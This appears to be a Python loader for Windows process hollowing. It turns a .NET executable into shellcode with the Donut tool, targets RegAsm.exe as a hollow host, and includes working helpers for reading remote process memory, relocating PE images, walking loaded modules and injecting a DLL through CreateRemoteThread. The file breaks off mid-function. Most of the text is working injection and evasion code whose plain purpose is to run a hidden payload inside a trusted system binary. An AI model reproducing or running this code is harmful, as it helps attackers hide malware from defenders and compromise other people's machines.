import ctypes
import os
import json
import struct
import subprocess
import sys
import zipfile
import urllib.request
import base64
from ctypes import wintypes
from pathlib import Path

_SCRIPT_DIR = Path(__file__).resolve().parent

# .NET EXE fed to Donut (-i). Rebuild payload_donut.bin when this is newer than the bin.
_DEFAULT_SOURCE_EXE = _SCRIPT_DIR.parent / "Binaries" / "Release" / "poopfart.exe"

# Donut PIC output (binary). run_shellcode() loads this (same directory as script.py).
_DEFAULT_SHELLCODE = _SCRIPT_DIR / "payload_donut.bin"

# Packaged Donut generator (extracts donut.exe on first use).
_DONUT_ZIP = Path(os.environ.get("DONUT_ZIP", r"C:\Users\fsjiu\Downloads\sdgsdg.zip"))
_DONUT_EXTRACT_DIR = Path(os.environ.get("DONUT_EXTRACT_DIR", r"C:\Users\fsjiu\Downloads\sdgsdg"))

# x64 managed payload: use 64-bit RegAsm as hollow host (matches PE32+ / AMD64).
_REGASM_FRAMEWORK64 = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
_REGASM_FRAMEWORK86 = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"


def _get_regasm_path():
    if sys.platform != "win32":
        return None
    if os.path.isfile(_REGASM_FRAMEWORK64):
        return _REGASM_FRAMEWORK64
    if os.path.isfile(_REGASM_FRAMEWORK86):
        return _REGASM_FRAMEWORK86
    env = os.environ.get("REGASM_PATH", "").strip()
    return env if env and os.path.isfile(env) else None


def _rp_log(msg):
    print(f"[run_pe] {msg}", file=sys.stderr, flush=True)


def _win_last_error(kernel32):
    err = kernel32.GetLastError()
    _rp_log(f"GetLastError() = {err} (0x{err:x})")


def _is_64bit_python():
    return ctypes.sizeof(ctypes.c_void_p) == 8


# --- PE constants ---
IMAGE_DOS_SIGNATURE = 0x5A4D
IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_FILE_MACHINE_I386 = 0x014C
IMAGE_FILE_MACHINE_AMD64 = 0x8664
IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10B
IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B
IMAGE_FILE_DLL = 0x2000

# --- Process / memory ---
CONTEXT_FULL = 0x10007
CREATE_SUSPENDED = 0x00000004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

# CONTEXT buffer sizes (Windows winnt.h)
CTX_X86_SIZE = 0x2CC
CTX_AMD64_SIZE = 0x4D0

# AMD64 CONTEXT register byte offsets (see MSDN CONTEXT x86 64-bit layout)
CTX64_OFF_CTXFLAGS = 0x30
CTX64_OFF_RAX = 0x78
CTX64_OFF_RCX = 0x80
CTX64_OFF_RDX = 0x88
CTX64_OFF_RIP = 0xF8
CTX64_OFF_RSP = 0x98

LIST_MODULES_DEFAULT = 0x0
LIST_MODULES_32BIT = 0x01
LIST_MODULES_64BIT = 0x02
LIST_MODULES_ALL = 0x03

# x86 CONTEXT register byte offsets (FLOATING_SAVE_AREA = 0x70 bytes after Dr regs)
CTX32_OFF_CTXFLAGS = 0x00
CTX32_OFF_EBX = 0xAC
CTX32_OFF_EAX = 0xB8


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPSTR),
        ("lpDesktop", wintypes.LPSTR),
        ("lpTitle", wintypes.LPSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class WOW64_FLOATING_SAVE_AREA(ctypes.Structure):
    _fields_ = [
        ("ControlWord", wintypes.DWORD),
        ("StatusWord", wintypes.DWORD),
        ("TagWord", wintypes.DWORD),
        ("ErrorOffset", wintypes.DWORD),
        ("ErrorSelector", wintypes.DWORD),
        ("DataOffset", wintypes.DWORD),
        ("DataSelector", wintypes.DWORD),
        ("RegisterArea", wintypes.BYTE * 80),
        ("Cr0NpxState", wintypes.DWORD),
    ]


class WOW64_CONTEXT(ctypes.Structure):
    """Layout from winnt.h; required by Wow64GetThreadContext from a 64-bit host (not CONTEXT)."""

    _fields_ = [
        ("ContextFlags", wintypes.DWORD),
        ("Dr0", wintypes.DWORD),
        ("Dr1", wintypes.DWORD),
        ("Dr2", wintypes.DWORD),
        ("Dr3", wintypes.DWORD),
        ("Dr6", wintypes.DWORD),
        ("Dr7", wintypes.DWORD),
        ("FloatSave", WOW64_FLOATING_SAVE_AREA),
        ("SegGs", wintypes.DWORD),
        ("SegFs", wintypes.DWORD),
        ("SegEs", wintypes.DWORD),
        ("SegDs", wintypes.DWORD),
        ("Edi", wintypes.DWORD),
        ("Esi", wintypes.DWORD),
        ("Ebx", wintypes.DWORD),
        ("Edx", wintypes.DWORD),
        ("Ecx", wintypes.DWORD),
        ("Eax", wintypes.DWORD),
        ("Ebp", wintypes.DWORD),
        ("Eip", wintypes.DWORD),
        ("SegCs", wintypes.DWORD),
        ("EFlags", wintypes.DWORD),
        ("Esp", wintypes.DWORD),
        ("SegSs", wintypes.DWORD),
    ]


def read_all_bytes(path):
    with open(path, "rb") as f:
        return bytearray(f.read())


def _donut_exe_path():
    """Return path to donut.exe from DONUT_EXTRACT_DIR or by extracting DONUT_ZIP (sdgsdg)."""
    ext = _DONUT_EXTRACT_DIR
    donut = ext / "donut.exe"
    if donut.is_file():
        return donut
    if not _DONUT_ZIP.is_file():
        return None
    ext.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(_DONUT_ZIP, "r") as zf:
        zf.extractall(ext)
    return donut if donut.is_file() else None


def rebuild_donut_shellcode(source_exe: Path, out_bin: Path) -> bool:
    """Run donut.exe -i source -o out (amd64, raw bin). Prints donut stderr on failure."""
    donut = _donut_exe_path()
    if donut is None:
        print(
            f"Donut not available: missing {_DONUT_ZIP} or donut.exe after extract to {_DONUT_EXTRACT_DIR}.",
            file=sys.stderr,
        )
        return False
    out_bin = Path(out_bin)
    out_bin.parent.mkdir(parents=True, exist_ok=True)
    cmd = [
        str(donut),
        "-i",
        str(source_exe),
        "-o",
        str(out_bin),
        "-a",
        "2",
        "-f",
        "1",
    ]
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=180,
            cwd=str(out_bin.parent),
        )
    except (OSError, subprocess.TimeoutExpired) as e:
        print(f"Donut subprocess failed: {e}", file=sys.stderr)
        return False
    if proc.stdout:
        print(proc.stdout, file=sys.stderr, end="")
    if proc.stderr:
        print(proc.stderr, file=sys.stderr, end="")
    if proc.returncode != 0:
        print(f"Donut exited with code {proc.returncode}.", file=sys.stderr)
        return False
    if not out_bin.is_file() or out_bin.stat().st_size < 64:
        print(f"Donut did not produce a usable file: {out_bin}", file=sys.stderr)
        return False
    return True


def _wpm_source_bytes(src, offset, nbytes):
    """Build a ctypes buffer WriteProcessMemory accepts (not plain bytearray/memoryview)."""
    if nbytes <= 0:
        return None
    chunk = memoryview(src)[offset : offset + nbytes]
    return (ctypes.c_char * nbytes).from_buffer_copy(chunk)


def _ctx_pack_u32(buf, off, val):
    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)


def _ctx_pack_u64(buf, off, val):
    struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)


def _ctx_unpack_u32(buf, off):
    return struct.unpack_from("<I", buf, off)[0]


def _ctx_unpack_u64(buf, off):
    return struct.unpack_from("<Q", buf, off)[0]


def _get_child_image_base(h_process, is_pe64, use_wow64_ctx):
    """Actual hollow-host load address (ASLR). NtUnmap/VirtualAlloc must target this, not PE ImageBase."""
    k32 = ctypes.windll.kernel32
    ntd = ctypes.windll.ntdll
    nread = ctypes.c_size_t(0)

    if use_wow64_ctx:
        class PROCESS_WOW64_INFORMATION(ctypes.Structure):
            _fields_ = [("Peb32BitAddress", ctypes.c_size_t)]

        info = PROCESS_WOW64_INFORMATION()
        st = ntd.NtQueryInformationProcess(
            h_process,
            26,  # ProcessWow64Information
            ctypes.byref(info),
            ctypes.sizeof(info),
            None,
        )
        if st != 0:
            return None
        peb32 = int(info.Peb32BitAddress)
        if peb32 == 0:
            return None
        base = ctypes.c_uint32(0)
        if not k32.ReadProcessMemory(
            h_process, ctypes.c_void_p(peb32 + 8), ctypes.byref(base), 4, ctypes.byref(nread)
        ):
            return None
        return int(base.value)

    if is_pe64:
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("ExitStatus", wintypes.LONG),
                ("PebBaseAddress", ctypes.c_void_p),
                ("AffinityMask", ctypes.c_size_t),
                ("BasePriority", wintypes.LONG),
                ("UniqueProcessId", ctypes.c_void_p),
                ("InheritedFromUniqueProcessId", ctypes.c_void_p),
            ]

        pbi = PROCESS_BASIC_INFORMATION()
        st = ntd.NtQueryInformationProcess(
            h_process,
            0,
            ctypes.byref(pbi),
            ctypes.sizeof(pbi),
            None,
        )
        if st != 0:
            return None
        peb = ctypes.cast(pbi.PebBaseAddress, ctypes.c_void_p).value or 0
        if peb == 0:
            return None
        base = ctypes.c_ulonglong(0)
        if not k32.ReadProcessMemory(
            h_process, ctypes.c_void_p(peb + 0x10), ctypes.byref(base), 8, ctypes.byref(nread)
        ):
            return None
        return int(base.value)

    class PROCESS_BASIC_INFORMATION32(ctypes.Structure):
        _fields_ = [
            ("ExitStatus", wintypes.LONG),
            ("PebBaseAddress", wintypes.DWORD),
            ("AffinityMask", wintypes.DWORD),
            ("BasePriority", wintypes.LONG),
            ("UniqueProcessId", wintypes.DWORD),
            ("InheritedFromUniqueProcessId", wintypes.DWORD),
        ]

    pbi = PROCESS_BASIC_INFORMATION32()
    st = ntd.NtQueryInformationProcess(
        h_process,
        0,
        ctypes.byref(pbi),
        ctypes.sizeof(pbi),
        None,
    )
    if st != 0:
        return None
    peb = int(pbi.PebBaseAddress)
    if peb == 0:
        return None
    base = ctypes.c_uint32(0)
    if not k32.ReadProcessMemory(h_process, ctypes.c_void_p(peb + 8), ctypes.byref(base), 4, ctypes.byref(nread)):
        return None
    return int(base.value)


def _parse_pe_optional(exe_buffer, e_lfanew):
    """Return common PE fields; optional layout depends on PE32 vs PE32+."""
    file_hdr = e_lfanew + 4
    machine = struct.unpack("<H", exe_buffer[file_hdr : file_hdr + 2])[0]
    num_sections = struct.unpack("<H", exe_buffer[file_hdr + 2 : file_hdr + 4])[0]
    size_opt = struct.unpack("<H", exe_buffer[file_hdr + 16 : file_hdr + 18])[0]
    file_chars = struct.unpack("<H", exe_buffer[file_hdr + 18 : file_hdr + 20])[0]

    opt_start = file_hdr + 20
    opt_magic = struct.unpack("<H", exe_buffer[opt_start : opt_start + 2])[0]

    entry_point = struct.unpack("<I", exe_buffer[opt_start + 0x10 : opt_start + 0x14])[0]
    size_of_image = struct.unpack("<I", exe_buffer[opt_start + 0x38 : opt_start + 0x3C])[0]
    size_of_headers = struct.unpack("<I", exe_buffer[opt_start + 0x3C : opt_start + 0x40])[0]
    subsystem = struct.unpack("<H", exe_buffer[opt_start + 0x44 : opt_start + 0x46])[0]
    dll_char = struct.unpack("<H", exe_buffer[opt_start + 0x46 : opt_start + 0x48])[0]

    if opt_magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC:
        image_base = struct.unpack("<I", exe_buffer[opt_start + 0x1C : opt_start + 0x20])[0]
        is_64 = False
    elif opt_magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC:
        image_base = struct.unpack("<Q", exe_buffer[opt_start + 0x18 : opt_start + 0x20])[0]
        is_64 = True
    else:
        raise ValueError(f"unsupported optional header magic 0x{opt_magic:04x}")

    section_offset = opt_start + size_opt
    sections = _pe_section_list(exe_buffer, section_offset, num_sections)

    return {
        "machine": machine,
        "num_sections": num_sections,
        "size_opt": size_opt,
        "opt_magic": opt_magic,
        "subsystem": subsystem,
        "dll_char": dll_char,
        "file_chars": file_chars,
        "image_base": image_base,
        "size_of_image": size_of_image,
        "size_of_headers": size_of_headers,
        "entry_point": entry_point,
        "section_offset": section_offset,
        "is_64": is_64,
        "sections": sections,
    }


def _pe_section_list(exe_buffer, section_offset, num_sections):
    out = []
    for i in range(num_sections):
        sh = section_offset + i * 0x28
        va = struct.unpack_from("<I", exe_buffer, sh + 0xC)[0]
        vsize = struct.unpack_from("<I", exe_buffer, sh + 0x8)[0]
        raw_ptr = struct.unpack_from("<I", exe_buffer, sh + 0x14)[0]
        out.append({"va": va, "vsize": vsize, "raw_ptr": raw_ptr})
    return out


def _rva_to_file_offset(sections, rva):
    for s in sections:
        va, vs, rp = s["va"], s["vsize"], s["raw_ptr"]
        if va <= rva < va + max(vs, 1):
            return rp + (rva - va)
    return None


def _data_dir_offset_from_optional(opt_start, is_pe64):
    # IMAGE_OPTIONAL_HEADER*: first IMAGE_DATA_DIRECTORY offset
    return opt_start + (0x70 if is_pe64 else 0x60)


def _round_up_alloc_size(size_of_image):
    """Round SizeOfImage to page size; some hosts need >= allocation granularity for fixed-address VirtualAllocEx."""
    page = 0x1000
    gran = 0x10000
    sz = (int(size_of_image) + page - 1) // page * page
    return (sz + gran - 1) // gran * gran


# IMAGE_REL_BASED_* (subset)
_IMAGE_REL_BASED_ABSOLUTE = 0
_IMAGE_REL_BASED_HIGHLOW = 3
_IMAGE_REL_BASED_DIR64 = 10


def _apply_base_relocations(exe_buffer, pe, opt_start, is_pe64, old_base, new_base):
    """
    Apply PE base relocations in-place on exe_buffer when the image is loaded at new_base
    instead of the PE's preferred ImageBase (old_base). Required when VirtualAllocEx(NULL, …).
    """
    sections = pe["sections"]
    dd0 = _data_dir_offset_from_optional(opt_start, is_pe64)
    rel_rva, rel_sz = struct.unpack_from("<II", exe_buffer, dd0 + 5 * 8)
    if rel_rva == 0 or rel_sz == 0:
        return old_base == new_base

    off = _rva_to_file_offset(sections, rel_rva)
    if off is None or rel_sz < 8:
        return old_base == new_base

    delta = new_base - old_base
    if not is_pe64:
        delta = struct.unpack("<i", struct.pack("<I", delta & 0xFFFFFFFF))[0]
    else:
        delta = struct.unpack("<q", struct.pack("<Q", delta & 0xFFFFFFFFFFFFFFFF))[0]

    end = off + rel_sz
    pos = off
    while pos + 8 <= end:
        page_rva = struct.unpack_from("<I", exe_buffer, pos)[0]
        block_size = struct.unpack_from("<I", exe_buffer, pos + 4)[0]
        if block_size < 8 or pos + block_size > end:
            break
        n_entries = (block_size - 8) // 2
        for i in range(n_entries):
            w = struct.unpack_from("<H", exe_buffer, pos + 8 + i * 2)[0]
            rel_type = (w >> 12) & 0xF
            rel_off = w & 0xFFF
            if rel_type == _IMAGE_REL_BASED_ABSOLUTE:
                continue
            target_rva = page_rva + rel_off
            file_off = _rva_to_file_offset(sections, target_rva)
            if file_off is None:
                continue
            if is_pe64 and rel_type == _IMAGE_REL_BASED_DIR64:
                val = struct.unpack_from("<Q", exe_buffer, file_off)[0]
                struct.pack_into("<Q", exe_buffer, file_off, (val + delta) & 0xFFFFFFFFFFFFFFFF)
            elif (not is_pe64) and rel_type == _IMAGE_REL_BASED_HIGHLOW:
                val = struct.unpack_from("<I", exe_buffer, file_off)[0]
                nv = (val + delta) & 0xFFFFFFFF
                struct.pack_into("<I", exe_buffer, file_off, nv)
        pos += block_size
    return True


# COM descriptor Flags (subset)
_COMIMAGE_FLAGS_NATIVE_ENTRYPOINT = 0x10


def _rid_bytes(rows, table_id):
    return 4 if rows.get(table_id, 0) >= 0x10000 else 2


def _coded_bytes(rows, tag_bits, *table_ids):
    """ECMA-335 II.24.2.6: index fits in 2 bytes if all (rid << tag_bits) | tag < 2**16."""
    ib = 16 - tag_bits
    lim = 1 << ib
    mx = 0
    for tag, tid in enumerate(table_ids):
        mx = max(mx, (rows.get(tid, 0) << tag_bits) | tag)
    return 4 if mx >= lim else 2


def _coded_has_custom_attribute(rows):
    """dnlib CodedToken.HasCustomAttribute (5 tag bits, 22 tables)."""
    tag_bits = 5
    tids = [
        0x06,
        0x04,
        0x01,
        0x02,
        0x08,
        0x09,
        0x0A,
        0x00,
        0x0E,
        0x17,
        0x14,
        0x11,
        0x1A,
        0x1B,
        0x20,
        0x23,
        0x26,
        0x27,
        0x28,
        0x2A,
        0x2C,
        0x2B,
    ]
    lim = 1 << (16 - tag_bits)
    mx = 0
    for tag, tid in enumerate(tids):
        mx = max(mx, (rows.get(tid, 0) << tag_bits) | tag)
    return 4 if mx >= lim else 2


def _coded_custom_attribute_type(rows):
    """MethodDef or MemberRef only (dnlib CustomAttributeType)."""
    tag_bits = 3
    mx = max((rows.get(0x06, 0) << tag_bits) | 2, (rows.get(0x0A, 0) << tag_bits) | 3)
    lim = 1 << (16 - tag_bits)
    return 4 if mx >= lim else 2


def _metadata_row_size(tid, rows, heap_sizes):
    """Return one #~ table row size in bytes, or None if unsupported."""
    ls = 4 if (heap_sizes & 1) else 2
    lg = 4 if (heap_sizes & 2) else 2
    lb = 4 if (heap_sizes & 4) else 2
    R = lambda t: _rid_bytes(rows, t)

    if tid == 0x00:
        return 2 + ls + lg + lg + lg
    if tid == 0x01:
        return _coded_bytes(rows, 2, 0x00, 0x1A, 0x23, 0x01) + ls + ls
    if tid == 0x02:
        return 4 + ls + ls + _coded_bytes(rows, 2, 0x02, 0x01, 0x1B) + R(0x04) + R(0x06)
    if tid == 0x03:
        return R(0x04)
    if tid == 0x04:
        return 2 + ls + lb
    if tid == 0x05:
        return R(0x06)
    if tid == 0x06:
        return 4 + 2 + 2 + ls + lb + R(0x08)
    if tid == 0x07:
        return R(0x08)
    if tid == 0x08:
        return 2 + 2 + ls
    if tid == 0x09:
        return R(0x02) + _coded_bytes(rows, 2, 0x02, 0x01, 0x1B)
    if tid == 0x0A:
        return _coded_bytes(rows, 3, 0x02, 0x01, 0x1A, 0x06, 0x1B) + ls + lb
    if tid == 0x0B:
        return 2 + _coded_bytes(rows, 2, 0x04, 0x08, 0x17) + lb
    if tid == 0x0C:
        return _coded_has_custom_attribute(rows) + _coded_custom_attribute_type(rows) + lb
    if tid == 0x0D:
        return _coded_bytes(rows, 1, 0x04, 0x08) + lb
    if tid == 0x0E:
        return 2 + _coded_bytes(rows, 2, 0x02, 0x06, 0x20) + lb
    if tid == 0x0F:
        return 2 + 4 + R(0x02)
    if tid == 0x10:
        return 4 + R(0x04)
    if tid == 0x11:
        return lb
    if tid == 0x12:
        return R(0x02) + R(0x14)
    if tid == 0x13:
        return R(0x14)
    if tid == 0x14:
        return 2 + ls + _coded_bytes(rows, 2, 0x02, 0x01, 0x1B)
    if tid == 0x15:
        return R(0x02) + R(0x17)
    if tid == 0x16:
        return R(0x17)
    if tid == 0x17:
        return 2 + ls + lb
    if tid == 0x18:
        return 2 + R(0x06) + _coded_bytes(rows, 1, 0x14, 0x17)
    if tid == 0x19:
        return R(0x02) + _coded_bytes(rows, 1, 0x06, 0x0A) + _coded_bytes(rows, 1, 0x06, 0x0A)
    if tid == 0x1A:
        return ls
    if tid == 0x1B:
        return lb
    if tid == 0x1C:
        return 2 + _coded_bytes(rows, 1, 0x04, 0x06) + ls + R(0x1A)
    if tid == 0x1D:
        return 4 + R(0x04)
    if tid == 0x1E:
        return 8
    if tid == 0x1F:
        return 4
    if tid == 0x20:
        return 4 + 8 + 4 + lb + ls + ls
    if tid == 0x21:
        return 4
    if tid == 0x22:
        return 12
    if tid == 0x23:
        return 8 + 4 + lb + ls + ls + lb
    if tid == 0x24:
        return 4 + R(0x23)
    if tid == 0x25:
        return 12 + R(0x23)
    if tid == 0x26:
        return 4 + ls + lb
    if tid == 0x27:
        return 4 + 4 + ls + ls + _coded_bytes(rows, 3, 0x26, 0x23, 0x27)
    if tid == 0x28:
        return 4 + 4 + ls + _coded_bytes(rows, 2, 0x26, 0x23, 0x27)
    if tid == 0x29:
        return R(0x02) + R(0x02)
    if tid == 0x2A:
        return 2 + 2 + _coded_bytes(rows, 1, 0x02, 0x06) + ls
    if tid == 0x2B:
        return _coded_bytes(rows, 1, 0x06, 0x0A) + lb
    if tid == 0x2C:
        return R(0x2A) + _coded_bytes(rows, 2, 0x02, 0x01, 0x1B)
    return None


def _parse_export_rva_from_disk(dll_path, export_names, _depth=0):
    """Return RVA of first matching export from a PE DLL on disk (PE32+ or PE32).

    Resolves forwarded exports (RVA inside export dir -> ASCII ``MOD.Export``) so callers
    get a real code RVA (e.g. kernel32!LoadLibraryW -> KERNELBASE).
    """
    if _depth > 8:
        return None
    try:
        with open(dll_path, "rb") as f:
            b = bytearray(f.read())
    except OSError:
        return None
    if len(b) < 0x200:
        return None
    if struct.unpack_from("<H", b, 0)[0] != IMAGE_DOS_SIGNATURE:
        return None
    e_lfa = struct.unpack_from("<I", b, 0x3C)[0]
    if struct.unpack_from("<I", b, e_lfa)[0] != IMAGE_NT_SIGNATURE:
        return None
    file_hdr = e_lfa + 4
    num_sections = struct.unpack_from("<H", b, file_hdr + 2)[0]
    size_opt = struct.unpack_from("<H", b, file_hdr + 16)[0]
    opt_start = file_hdr + 20
    magic = struct.unpack_from("<H", b, opt_start)[0]
    is_pe64 = magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC
    is_pe32 = magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC
    if not is_pe64 and not is_pe32:
        return None
    dd0 = _data_dir_offset_from_optional(opt_start, is_pe64)
    exp_rva, exp_sz = struct.unpack_from("<II", b, dd0)
    if exp_rva == 0 or exp_sz < 40:
        return None
    sections = _pe_section_list(b, opt_start + size_opt, num_sections)
    exp_off = _rva_to_file_offset(sections, exp_rva)
    if exp_off is None:
        return None
    # IMAGE_EXPORT_DIRECTORY (subset)
    num_funcs = struct.unpack_from("<I", b, exp_off + 0x14)[0]
    num_names = struct.unpack_from("<I", b, exp_off + 0x18)[0]
    funcs_rva = struct.unpack_from("<I", b, exp_off + 0x1C)[0]
    names_rva = struct.unpack_from("<I", b, exp_off + 0x20)[0]
    ordinals_rva = struct.unpack_from("<I", b, exp_off + 0x24)[0]
    names_off = _rva_to_file_offset(sections, names_rva)
    ord_off = _rva_to_file_offset(sections, ordinals_rva)
    funcs_off = _rva_to_file_offset(sections, funcs_rva)
    if names_off is None or ord_off is None or funcs_off is None:
        return None
    want = {n.lower() for n in export_names}
    for i in range(min(num_names, 8192)):
        name_rva = struct.unpack_from("<I", b, names_off + i * 4)[0]
        name_off = _rva_to_file_offset(sections, name_rva)
        if name_off is None:
            continue
        end = b.find(b"\0", name_off)
        if end < 0:
            continue
        nm = b[name_off:end].decode("ascii", errors="replace").lower()
        if nm not in want:
            continue
        ord_idx = struct.unpack_from("<H", b, ord_off + i * 2)[0]
        if ord_idx >= num_funcs:
            continue
        fn_rva = struct.unpack_from("<I", b, funcs_off + ord_idx * 4)[0]
        if fn_rva == 0:
            return None
        if exp_rva <= fn_rva < exp_rva + exp_sz:
            fwd_off = _rva_to_file_offset(sections, fn_rva)
            if fwd_off is None:
                return None
            end = b.find(b"\0", fwd_off)
            if end < 0:
                return None
            s = b[fwd_off:end].decode("ascii", errors="replace").strip()
            if "." not in s:
                return None
            modstub, sym = s.rsplit(".", 1)
            if not sym:
                return None
            sys32 = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
            ddir = os.path.dirname(dll_path)
            moddll = modstub if modstub.lower().endswith(".dll") else (modstub + ".dll")
            for cand in (
                os.path.normpath(os.path.join(ddir, moddll)),
                os.path.normpath(os.path.join(sys32, moddll)),
            ):
                if os.path.isfile(cand):
                    return _parse_export_rva_from_disk(cand, (sym,), _depth + 1)
            return None
        return fn_rva
    return None


def _peb_ldr_modules_x64(h_process):
    """Walk InLoadOrderModuleList; return [(basename_lower, base), ...]."""
    k32 = ctypes.windll.kernel32
    ntd = ctypes.windll.ntdll

    class PROCESS_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("ExitStatus", wintypes.LONG),
            ("PebBaseAddress", ctypes.c_void_p),
            ("AffinityMask", ctypes.c_size_t),
            ("BasePriority", wintypes.LONG),
            ("UniqueProcessId", ctypes.c_void_p),
            ("InheritedFromUniqueProcessId", ctypes.c_void_p),
        ]

    pbi = PROCESS_BASIC_INFORMATION()
    st = ntd.NtQueryInformationProcess(h_process, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
    if st != 0:
        return []
    peb = ctypes.cast(pbi.PebBaseAddress, ctypes.c_void_p).value or 0
    if peb == 0:
        return []
    ldr = ctypes.c_ulonglong(0)
    nread = ctypes.c_size_t(0)
    if not k32.ReadProcessMemory(h_process, ctypes.c_void_p(peb + 0x18), ctypes.byref(ldr), 8, ctypes.byref(nread)):
        return []
    ldr_ptr = int(ldr.value)
    head = ldr_ptr + 0x10
    cur = ctypes.c_ulonglong(0)
    if not k32.ReadProcessMemory(h_process, ctypes.c_void_p(head), ctypes.byref(cur), 8, ctypes.byref(nread)):
        return []
    cur = int(cur.value)
    out = []
    guard = 0
    while cur != head and guard < 512:
        guard += 1
        entry = cur
        dll_base = ctypes.c_ulonglong(0)
        if not k32.ReadProcessMemory(h_process, ctypes.c_void_p(entry + 0x30), ctypes.byref(dll_base), 8, ctypes.byref(nread)):
            break
        us_len = ctypes.c_ushort(0)
        buf_ptr = ctypes.c_ulonglong(0)
        if not k32.ReadProcessMemory(h_process, ctypes.c_void_p(entry + 0x58), ctypes.byref(us_len), 2, ctypes.byref(nread)):
            break
        if not k32.ReadProcessMemory(h_process, ctypes.c_void_p(entry + 0x60), ctypes.byref(buf_ptr), 8, ctypes.byref(nread)):
            break
        ln = int(us_len.value)
        bp = int(buf_ptr.value)
        name = ""
        if ln > 0 and ln < 1024 and bp != 0:
            raw = (ctypes.c_ubyte * ln)()
            if k32.ReadProcessMemory(h_process, ctypes.c_void_p(bp), raw, ln, ctypes.byref(nread)):
                name = bytes(raw).decode("utf-16le", errors="replace").lower()
        out.append((name, int(dll_base.value)))
        nxt = ctypes.c_ulonglong(0)
        if not k32.ReadProcessMemory(h_process, ctypes.c_void_p(cur), ctypes.byref(nxt), 8, ctypes.byref(nread)):
            break
        cur = int(nxt.value)
    return out


def _find_remote_module_base(h_process, name_suffix_lower):
    """Return load address of module in remote process (e.g. mscoree.dll)."""
    psapi = ctypes.WinDLL("psapi", use_last_error=True)
    psapi.EnumProcessModules.argtypes = [
        wintypes.HANDLE,
        ctypes.POINTER(ctypes.c_void_p),
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    psapi.EnumProcessModules.restype = wintypes.BOOL
    if hasattr(psapi, "EnumProcessModulesEx"):
        psapi.EnumProcessModulesEx.argtypes = [
            wintypes.HANDLE,
            ctypes.POINTER(ctypes.c_void_p),
            wintypes.DWORD,
            ctypes.POINTER(wintypes.DWORD),
            wintypes.DWORD,
        ]
        psapi.EnumProcessModulesEx.restype = wintypes.BOOL
    psapi.GetModuleBaseNameW.argtypes = [
        wintypes.HANDLE,
        wintypes.HANDLE,
        wintypes.LPWSTR,
        wintypes.DWORD,
    ]
    psapi.GetModuleBaseNameW.restype = wintypes.DWORD

    def _scan_mod_array(n, mods_ptr):
        wbuf = ctypes.create_unicode_buffer(4096)
        for i in range(n):
            h = mods_ptr[i]
            if not h:
                continue
            if psapi.GetModuleBaseNameW(h_process, h, wbuf, len(wbuf)) == 0:
                continue
            bn = wbuf.value.lower()
            if bn == name_suffix_lower or bn.endswith("\\" + name_suffix_lower) or bn.endswith(name_suffix_lower):
                return int(ctypes.cast(h, ctypes.c_void_p).value or 0)
        return None

    mods = (ctypes.c_void_p * 4096)()
    cb = wintypes.DWORD()
    if hasattr(psapi, "EnumProcessModulesEx"):
        if psapi.EnumProcessModulesEx(
            h_process,
            ctypes.cast(mods, ctypes.POINTER(ctypes.c_void_p)),
            ctypes.sizeof(mods),
            ctypes.byref(cb),
            LIST_MODULES_ALL,
        ):
            n = min(len(mods), cb.value // ctypes.sizeof(ctypes.c_void_p))
            hit = _scan_mod_array(n, mods)
            if hit:
                return hit
    if psapi.EnumProcessModules(
        h_process, ctypes.cast(mods, ctypes.POINTER(ctypes.c_void_p)), ctypes.sizeof(mods), ctypes.byref(cb)
    ):
        n = min(len(mods), cb.value // ctypes.sizeof(ctypes.c_void_p))
        hit = _scan_mod_array(n, mods)
        if hit:
            return hit
    return None


def _find_dll_base_peb_then_psapi(h_process, basename_lower):
    """Match full basename (e.g. kernel32.dll); PEB/LDR first, then psapi."""
    want = basename_lower.lower().strip()
    for name, base in _peb_ldr_modules_x64(h_process):
        if not name:
            continue
        leaf = name.split("\\")[-1]
        if leaf == want:
            return base
    return _find_remote_module_base(h_process, want)


def _remote_loadlibrary_w_kernel32(h_process, dll_path_wide):
    """
    Load a DLL into the remote process via LoadLibraryW (CreateRemoteThread).

    Uses KERNELBASE (real implementation) when possible; kernel32 exports are often
    forwarders — using the forwarder RVA would start the thread in the export blob, not code.
    """
    k32 = ctypes.windll.kernel32
    k32.WriteProcessMemory.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t),
    ]
    k32.WriteProcessMemory.restype = wintypes.BOOL
    k32.CreateRemoteThread.argtypes = [
        wintypes.HANDLE,
